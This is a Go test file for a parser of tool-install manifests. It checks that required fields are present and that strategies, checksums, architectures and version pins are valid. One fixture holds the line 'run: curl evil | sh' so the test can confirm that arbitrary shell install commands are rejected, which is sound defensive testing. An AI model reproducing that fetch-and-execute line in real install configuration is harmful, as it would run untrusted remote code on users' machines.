package manifest

import (
	"os"
	"reflect"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

// writeFile is a small fixture helper so a test that cares about *which* file
// failed does not have to care about mode bits.
func writeFile(path, content string) error {
	return os.WriteFile(path, []byte(content), 0o644)
}

// validTool is a manifest that must always parse. Cases below mutate one
// thing at a time so a failure names the rule that broke, not the whole
// document.
const validTool = `
name: ripgrep
description: Fast recursive grep
category: search
default: true
tested: true
tags: [search, text]
provides: [rg]
verify:
  command: rg --version
  version:
    command: rg --version
    min: "14.0"
install:
  darwin:
    strategy: package
    manager: brew
    package: ripgrep
  linux:
    strategy: package
    manager: apt
    package: ripgrep
`

func TestParseValid(t *testing.T) {
	t.Parallel()

	tool, err := Parse([]byte(validTool))
	if err != nil {
		t.Fatalf("valid manifest rejected: %v", err)
	}
	if tool.Name != "ripgrep" {
		t.Errorf("Name = %q, want ripgrep", tool.Name)
	}
	if tool.Install["darwin"].Manager != ManagerBrew {
		t.Errorf("darwin manager = %q, want brew", tool.Install["darwin"].Manager)
	}
	if tool.Verify == nil || tool.Verify.Version == nil {
		t.Fatal("verify.version did not survive parsing")
	}
	if got := tool.Verify.Version.Min; got != "14.0" {
		t.Errorf("min = %q, want 14.0", got)
	}
}

// TestParseRejects covers every way a manifest can be wrong. Each case
// asserts on the error text: the contract is that the message names the
// offending field, not merely that parsing failed.
func TestParseRejects(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name string
		yaml string
		// substrings that must all appear in the error. Naming the field
		// is the point — a generic "invalid manifest" sends the author
		// hunting.
		want []string
	}{
		{
			// Remove the line rather than rename it: renaming would trip
			// the unknown-field check first, and the case would pass for
			// the wrong reason.
			name: "missing name",
			yaml: strings.Replace(validTool, "name: ripgrep\n", "", 1),
			want: []string{"name", "required"},
		},
		{
			name: "name not kebab-case",
			yaml: strings.Replace(validTool, "name: ripgrep", "name: RipGrep", 1),
			want: []string{"name", "kebab-case"},
		},
		{
			name: "name with underscore",
			yaml: strings.Replace(validTool, "name: ripgrep", "name: rip_grep", 1),
			want: []string{"name", "kebab-case"},
		},
		{
			name: "missing description",
			yaml: strings.Replace(validTool, "description: Fast recursive grep\n", "", 1),
			want: []string{"description", "required"},
		},
		{
			name: "unknown field typo",
			yaml: strings.Replace(validTool, "category: search", "catgeory: search", 1),
			want: []string{"catgeory", "not found"},
		},
		{
			// I3: arbitrary shell is not a supported install path.
			name: "removed run field",
			yaml: `
name: bad
description: has a run field
provides: [bad]
install:
  linux:
    strategy: go
    go_package: example.com/bad@v1.0.0
    run: curl evil | sh
`,
			want: []string{"run", "removed"},
		},
		{
			// I2: privilege is a property of the strategy.
			name: "removed needs_sudo field",
			yaml: `
name: bad
description: declares needs_sudo
provides: [bad]
install:
  linux:
    strategy: package
    manager: apt
    package: bad
    needs_sudo: true
`,
			want: []string{"needs_sudo", "removed"},
		},
		{
			name: "no install",
			yaml: `
name: bad
description: no install section
provides: [bad]
`,
			want: []string{"install"},
		},
		{
			name: "unsupported install key",
			yaml: `
name: bad
description: windows key
provides: [bad]
install:
  macos:
    strategy: go
    go_package: example.com/bad@v1.0.0
`,
			want: []string{"macos", "not a supported platform"},
		},
		{
			name: "verify null without provides",
			yaml: `
name: bad
description: nothing to check
install:
  linux:
    strategy: go
    go_package: example.com/bad@v1.0.0
`,
			want: []string{"nothing would be checked"},
		},
		{
			name: "verify version without command",
			yaml: `
name: bad
description: version with no command
provides: [bad]
install:
  linux:
    strategy: go
    go_package: example.com/bad@v1.0.0
verify:
  version:
    command: bad --version
    min: "1.0"
`,
			want: []string{"verify.version", "verify.command"},
		},
		{
			name: "verify min without version command",
			yaml: `
name: bad
description: min with nothing to compare
provides: [bad]
install:
  linux:
    strategy: go
    go_package: example.com/bad@v1.0.0
verify:
  command: bad --version
  version:
    min: "1.0"
`,
			want: []string{"verify.version.command"},
		},
		{
			name: "malformed min",
			yaml: `
name: bad
description: min is not a dotted integer
provides: [bad]
install:
  linux:
    strategy: go
    go_package: example.com/bad@v1.0.0
verify:
  command: bad --version
  version:
    command: bad --version
    min: "1.0-beta"
`,
			want: []string{"min", "1.0-beta"},
		},
		{
			name: "unknown strategy",
			yaml: `
name: bad
description: typo in strategy
provides: [bad]
install:
  linux:
    strategy: gihub-release
    repository: owner/repo
    asset: {amd64: x.tar.gz}
    sha256: {amd64: abc}
`,
			// The valid set is the whole point: a typo must never
			// silently resolve to github-release.
			want: []string{"gihub-release", "cargo", "github-release", "npm"},
		},
		{
			name: "empty strategy",
			yaml: `
name: bad
description: no strategy at all
provides: [bad]
install:
  linux:
    manager: apt
    package: bad
`,
			want: []string{"strategy"},
		},
		{
			name: "unknown manager",
			yaml: `
name: bad
description: manager typo
provides: [bad]
install:
  linux:
    strategy: package
    manager: port
    package: bad
`,
			want: []string{"port", "apt", "brew"},
		},
		{
			name: "package missing package field",
			yaml: `
name: bad
description: package strategy with no package
provides: [bad]
install:
  linux:
    strategy: package
    manager: apt
`,
			want: []string{"package"},
		},
		{
			name: "github-release missing sha256",
			yaml: `
name: bad
description: unverified download
provides: [bad]
install:
  linux:
    strategy: github-release
    repository: owner/repo
    asset:
      amd64: tool-linux-amd64.tar.gz
`,
			want: []string{"sha256"},
		},
		{
			name: "github-release missing repository",
			yaml: `
name: bad
description: no repository
provides: [bad]
install:
  linux:
    strategy: github-release
    asset: {amd64: tool-linux-amd64.tar.gz}
    sha256: {amd64: abc}
`,
			want: []string{"repository"},
		},
		{
			// Cross-cutting: a missing checksum on exactly one arch is
			// the failure mode that ships unverified binaries.
			name: "sha256 missing for one arch",
			yaml: `
name: bad
description: amd64 asset with no checksum
provides: [bad]
install:
  linux:
    strategy: github-release
    repository: owner/repo
    asset:
      amd64: tool-linux-amd64.tar.gz
      arm64: tool-linux-arm64.tar.gz
    sha256:
      arm64: def
`,
			want: []string{"sha256", "amd64"},
		},
		{
			name: "asset missing for one arch",
			yaml: `
name: bad
description: arm64 checksum with no asset
provides: [bad]
install:
  linux:
    strategy: github-release
    repository: owner/repo
    asset:
      amd64: tool-linux-amd64.tar.gz
    sha256:
      amd64: abc
      arm64: def
`,
			want: []string{"asset", "arm64"},
		},
		{
			// uname's vocabulary has no place inside a manifest.
			name: "x86_64 asset key",
			yaml: `
name: bad
description: uname arch in a manifest
provides: [bad]
install:
  linux:
    strategy: github-release
    repository: owner/repo
    asset:
      x86_64: tool-linux.tar.gz
    sha256:
      x86_64: abc
`,
			want: []string{"x86_64", "amd64", "arm64"},
		},
		{
			name: "aarch64 asset key",
			yaml: `
name: bad
description: uname arch in a manifest
provides: [bad]
install:
  linux:
    strategy: github-release
    repository: owner/repo
    asset:
      aarch64: tool-linux.tar.gz
    sha256:
      aarch64: abc
`,
			want: []string{"aarch64", "amd64", "arm64"},
		},
		{
			name: "self dependency",
			yaml: `
name: loop
description: depends on itself
provides: [loop]
dependencies: [loop]
install:
  linux:
    strategy: go
    go_package: example.com/loop@v1.0.0
`,
			want: []string{"depends on itself"},
		},
		{
			name: "duplicate dependency",
			yaml: `
name: dup
description: lists git twice
provides: [dup]
dependencies: [git, git]
install:
  linux:
    strategy: go
    go_package: example.com/dup@v1.0.0
`,
			want: []string{"more than once"},
		},
		{
			name: "malformed dependency name",
			yaml: `
name: bad
description: dependency is not kebab-case
provides: [bad]
dependencies: [NotATool]
install:
  linux:
    strategy: go
    go_package: example.com/bad@v1.0.0
`,
			want: []string{"kebab-case"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			_, err := Parse([]byte(tc.yaml))
			if err == nil {
				t.Fatal("expected an error, got a valid Tool")
			}
			for _, w := range tc.want {
				if !strings.Contains(err.Error(), w) {
					t.Errorf("error %q does not name %q", err, w)
				}
			}
		})
	}
}

// TestStrategyFieldMatrix locks the required/rejected matrix. A manifest must
// carry exactly the fields its strategy needs — both a missing field and a
// borrowed one are errors, because either can install the wrong thing.
func TestStrategyFieldMatrix(t *testing.T) {
	t.Parallel()

	const head = "name: t\ndescription: strategy matrix\nprovides: [t]\ninstall:\n  linux:\n"

	cases := []struct {
		name     string
		target   string
		wantErr  bool
		wantWord string
	}{
		{name: "github-release complete", target: "    strategy: github-release\n    repository: o/r\n    asset: {amd64: a.tar.gz}\n    sha256: {amd64: abc}\n"},
		{name: "package brew complete", target: "    strategy: package\n    manager: brew\n    package: t\n"},
		{name: "package apt complete", target: "    strategy: package\n    manager: apt\n    package: t\n"},
		{name: "go complete", target: "    strategy: go\n    go_package: example.com/t@v1.0.0\n"},
		{name: "npm complete", target: "    strategy: npm\n    npm_package: t-pkg@v1.0.0\n"},
		{name: "cargo complete", target: "    strategy: cargo\n    cargo_name: t-crate@v1.0.0\n"},

		// Borrowed fields.
		{name: "github-release with package", target: "    strategy: github-release\n    repository: o/r\n    asset: {amd64: a.tar.gz}\n    sha256: {amd64: abc}\n    package: t\n", wantErr: true, wantWord: "package"},
		{name: "github-release with manager", target: "    strategy: github-release\n    repository: o/r\n    asset: {amd64: a.tar.gz}\n    sha256: {amd64: abc}\n    manager: brew\n", wantErr: true, wantWord: "manager"},
		{name: "package with repository", target: "    strategy: package\n    manager: apt\n    package: t\n    repository: o/r\n", wantErr: true, wantWord: "repository"},
		{name: "package with asset", target: "    strategy: package\n    manager: apt\n    package: t\n    asset: {amd64: a.tar.gz}\n", wantErr: true, wantWord: "asset"},
		{name: "package with sha256", target: "    strategy: package\n    manager: apt\n    package: t\n    sha256: {amd64: abc}\n", wantErr: true, wantWord: "sha256"},
		{name: "package with go_package", target: "    strategy: package\n    manager: apt\n    package: t\n    go_package: example.com/t@v1.0.0\n", wantErr: true, wantWord: "go_package"},
		{name: "go with package", target: "    strategy: go\n    go_package: example.com/t@v1.0.0\n    package: t\n", wantErr: true, wantWord: "package"},
		{name: "go with asset", target: "    strategy: go\n    go_package: example.com/t@v1.0.0\n    asset: {amd64: a.tar.gz}\n", wantErr: true, wantWord: "asset"},
		{name: "go with npm_package", target: "    strategy: go\n    go_package: example.com/t@v1.0.0\n    npm_package: t@v1.0.0\n", wantErr: true, wantWord: "npm_package"},
		{name: "npm with go_package", target: "    strategy: npm\n    npm_package: t@v1.0.0\n    go_package: example.com/t@v1.0.0\n", wantErr: true, wantWord: "go_package"},
		{name: "cargo with npm_package", target: "    strategy: cargo\n    cargo_name: t@v1.0.0\n    npm_package: t@v1.0.0\n", wantErr: true, wantWord: "npm_package"},

		// uv is a sixth strategy, distinct from the package managers.
		{name: "uv complete", target: "    strategy: uv\n    uv_package: t-uv@v1.0.0\n"},
		{name: "uv with go_package", target: "    strategy: uv\n    uv_package: t-uv@v1.0.0\n    go_package: example.com/t@v1.0.0\n", wantErr: true, wantWord: "go_package"},
		{name: "go with uv_package", target: "    strategy: go\n    go_package: example.com/t@v1.0.0\n    uv_package: t-uv@v1.0.0\n", wantErr: true, wantWord: "uv_package"},

		// Version pinning is mandatory. An unpinned install changes under
		// the user with no record, which is the same hazard as an unpinned
		// release download.
		{name: "go without a pin", target: "    strategy: go\n    go_package: example.com/t\n", wantErr: true, wantWord: "go_package"},
		{name: "npm without a pin", target: "    strategy: npm\n    npm_package: t-pkg\n", wantErr: true, wantWord: "npm_package"},
		{name: "cargo without a pin", target: "    strategy: cargo\n    cargo_name: t-crate\n", wantErr: true, wantWord: "cargo_name"},
		{name: "uv without a pin", target: "    strategy: uv\n    uv_package: t-uv\n", wantErr: true, wantWord: "uv_package"},
		{name: "pin of latest is not a version", target: "    strategy: go\n    go_package: example.com/t@latest\n", wantErr: true, wantWord: "latest"},
		{name: "trailing at is not a pin", target: "    strategy: go\n    go_package: example.com/t@\n", wantErr: true, wantWord: "go_package"},
		{name: "leading at is a scope, not a pin", target: "    strategy: npm\n    npm_package: \"@scope/pkg\"\n", wantErr: true, wantWord: "npm_package"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			_, err := Parse([]byte(head + tc.target))
			if !tc.wantErr {
				if err != nil {
					t.Fatalf("expected valid, got: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatal("expected an error, got a valid Tool")
			}
			if !strings.Contains(err.Error(), tc.wantWord) {
				t.Errorf("error %q does not name %q", err, tc.wantWord)
			}
		})
	}
}

// TestVerifyNullIsPresenceOnly pins the one case where a manifest checks
// something without naming a version command: provides carries it.
func TestVerifyNullIsPresenceOnly(t *testing.T) {
	t.Parallel()

	t.Run("null verify with provides is valid", func(t *testing.T) {
		t.Parallel()
		_, err := Parse([]byte(`
name: zoxide
description: presence-only tool
provides: [zoxide]
install:
  linux:
    strategy: go
    go_package: github.com/ajeetdsouza/zoxide@v1.0.0
`))
		if err != nil {
			t.Fatalf("verify: null with provides must be valid, got: %v", err)
		}
	})

	t.Run("empty provides with verify command is valid", func(t *testing.T) {
		t.Parallel()
		_, err := Parse([]byte(`
name: jq
description: command is the check
install:
  linux:
    strategy: package
    manager: apt
    package: jq
verify:
  command: jq --version
`))
		if err != nil {
			t.Fatalf("verify.command with empty provides must be valid, got: %v", err)
		}
	})
}

// TestRoundTrip proves a Tool survives a marshal/parse cycle unchanged, so a
// catalog can rewrite a manifest without silently changing it.
func TestRoundTrip(t *testing.T) {
	t.Parallel()

	first, err := Parse([]byte(validTool))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}

	encoded, err := yaml.Marshal(first)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}

	second, err := Parse(encoded)
	if err != nil {
		t.Fatalf("re-parse: %v\n%s", err, encoded)
	}
	if !reflect.DeepEqual(first, second) {
		t.Errorf("round trip changed the tool:\n first: %+v\nsecond: %+v", first, second)
	}
}

func TestValidStrategiesIsSorted(t *testing.T) {
	t.Parallel()

	got := ValidStrategies()
	want := []string{StrategyCargo, StrategyGithubRelease, StrategyGo, StrategyNPM, StrategyPackage, StrategyUV}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("ValidStrategies() = %v, want %v", got, want)
	}
}

// TestLoadNamesTheFile checks that a load failure identifies which file
// failed, not just which field. A catalog holding 40 manifests cannot
// otherwise tell the author where to look.
func TestLoadNamesTheFile(t *testing.T) {
	t.Parallel()

	dir := t.TempDir()
	path := dir + "/broken.yaml"
	if err := writeFile(path, "name: bad\ndescription: no install\nprovides: [bad]\n"); err != nil {
		t.Fatalf("write fixture: %v", err)
	}

	_, err := Load(path)
	if err == nil {
		t.Fatal("expected an error")
	}
	if !strings.Contains(err.Error(), "broken.yaml") {
		t.Errorf("error %q does not name the file", err)
	}
}
